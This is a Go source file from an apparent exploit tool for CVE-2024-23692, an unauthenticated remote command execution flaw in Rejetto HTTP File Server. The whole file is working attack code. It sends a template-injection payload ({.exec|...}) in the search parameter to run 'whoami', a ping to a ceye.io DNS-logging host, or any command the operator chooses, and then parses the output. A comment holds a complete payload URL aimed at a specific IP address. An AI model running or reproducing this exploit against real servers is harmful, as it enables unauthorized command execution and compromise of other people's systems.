package cve

import (
	"CVE-2024-23692/ceye"
	"CVE-2024-23692/config"
	newclient "CVE-2024-23692/newClient"
	"fmt"
	"html"
	"io"
	"net/http"
	"regexp"
	"strings"
)

type CVE202423692 struct {
	Target     string
	ProxyStr   string
	Timeout    int
	DefaultCmd string
	Headers    map[string]string
}

func NewCVE202423962(target string, proxy string) *CVE202423692 {
	return &CVE202423692{
		Target:     target,
		Timeout:    20,
		ProxyStr:   proxy,
		DefaultCmd: "whoami",
		Headers: map[string]string{
			"User-Agent":                newclient.ReturnUA(),
			"Accept-Language":           "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
			"Upgrade-Insecure-Requests": "1",
			"Priority":                  "u=1",
			"Cache-Control":             "max-age=0",
		},
	}
}

func (c *CVE202423692) sendRequest(client *http.Client, method, url string, body io.Reader, headers map[string]string) (*http.Response, error) {
	request, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}
	for k, v := range headers {
		request.Header.Set(k, v)
	}
	return client.Do(request)
}

func (c *CVE202423692) Check() {
	client := newclient.ClientFUNC(c.ProxyStr, c.Timeout)
	var path string
	// http://111.229.156.239/?n=%0A&cmd=whoami&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}
	if strings.HasSuffix(c.Target, "/") {
		path = `?n=%0A&cmd=` + c.DefaultCmd + `&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}`
	} else {
		path = `/?n=%0A&cmd=` + c.DefaultCmd + `&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}`
	}

	url := c.Target + path
	resposne, err := c.sendRequest(client, "GET", url, nil, c.Headers)
	if err != nil {
		return
	}
	defer resposne.Body.Close()

	body, err := io.ReadAll(resposne.Body)
	if err != nil {
		return
	}
	if resposne.StatusCode == http.StatusOK {
		result := pattern_result((string(body)))
		if result != "" && len(result) != 0 {
			rs := fmt.Sprintf("[+] %s 存在CVE-2024-23692 HFS文件服务器未授权RCE!", c.Target)
			fmt.Println(rs)
			fmt.Println("[+] Influence Version: Rejetto HTTP File Server <= 2.3")
			cmd := fmt.Sprintf("[+] Command Result: %s", result)
			fmt.Println(cmd)
		} else {
			rs := fmt.Sprintf("[-] %s 不存在CVE-2024-23692 文件服务器未授权RCE!", c.Target)
			fmt.Println(rs)
		}
	} else {
		rs := fmt.Sprintf("[-] %s 不存在CVE-2024-23692文件服务器未授权RCE!", c.Target)
		fmt.Println(rs)
	}

}

func isExploitSuccessful(htmlContent string) (bool, string) {
	// 寻找RESULT:和====之间的内容
	startIndex := strings.Index(htmlContent, "RESULT:")
	if startIndex == -1 {
		return false, ""
	}
	startIndex += len("RESULT:\n")

	endIndex := strings.Index(htmlContent, "====\n")
	if endIndex == -1 {
		return false, ""
	}

	resultContent := strings.TrimSpace(htmlContent[startIndex:endIndex])

	// 判断是否成功
	if resultContent != "" {
		return true, resultContent
	} else {
		return false, ""
	}
}

func pattern_result(htmlContent string) string {
	decodedHTML := html.UnescapeString(htmlContent)
	// 定义正则表达式
	pattern := `RESULT:\s*(.*?)\s*====`
	// 编译正则表达似乎
	re := regexp.MustCompile(pattern)
	// 在html中匹配文本信息
	matches := re.FindStringSubmatch(decodedHTML)

	if matches != nil {

		return matches[1]
	} else {
		return ""
	}
}

func (c *CVE202423692) Dnslog(dns string) {
	c.Timeout = 60
	client := newclient.ClientFUNC(c.ProxyStr, c.Timeout)
	config, _ := config.ReturnConfig()

	if dns == "" {
		dns = config.Ceye.Identifier
		if dns == "" {
			fmt.Println("[-] Please configure the config.ini file in the config directory!")
			return
		} else {
			rs := fmt.Sprintf("[+] Using Default DNS: %s, Please wait a moment!", dns)
			fmt.Println(rs)
		}

	} else {
		rs := fmt.Sprintf("[+] Using Custom DNS: %s, Please wait a moment!", dns)
		fmt.Println(rs)
	}

	// 构建命令
	commad := fmt.Sprintf("%s+%s.%s", "ping", "CVE202423692", dns)
	var path string
	if strings.HasSuffix(c.Target, "/") {
		path = `?n=%0A&cmd=` + commad + `&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}`
	} else {
		path = `/?n=%0A&cmd=` + commad + `&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}`
	}

	url := c.Target + path
	response, err := c.sendRequest(client, "GET", url, nil, c.Headers)
	if err != nil {
		return
	}
	defer response.Body.Close()

	body, err := io.ReadAll(response.Body)
	if err != nil {
		return
	}

	if response.StatusCode == http.StatusOK {
		isResult, content := isExploitSuccessful(string(body))
		if isResult {
			fmt.Println(content)
		}
		ceye, err := ceye.GetCeyeResult(c.ProxyStr, "CVE202423692")
		if err != nil {
			fmt.Println("[!] Error getting Ceye result:", err)
			return
		}
		if dns == "" && len(ceye) != 0 {
			fmt.Println("[+] ceye result:\n", ceye)
		} else {
			fmt.Println("[+] 存在CVE-2024-23692, 没有使用默认DNS(ceye.io), 可回相应平台查看结果！")
		}
	}

}

func (c *CVE202423692) Exploit(command string) string {
	client := newclient.ClientFUNC(c.ProxyStr, c.Timeout)
	var path string
	if strings.HasSuffix(c.Target, "/") {
		path = `?n=%0A&cmd=` + command + `&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}`
	} else {
		path = `/?n=%0A&cmd=` + command + `&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}`
	}

	url := c.Target + path
	resposne, err := c.sendRequest(client, "GET", url, nil, c.Headers)
	if err != nil {
		return ""
	}
	defer resposne.Body.Close()

	body, err := io.ReadAll(resposne.Body)
	if err != nil {
		return ""
	}
	if resposne.StatusCode == http.StatusOK {
		isResult, content := isExploitSuccessful(string(body))
		if isResult {
			return content
		} else {
			return ""
		}
	} else {
		return ""
	}
}
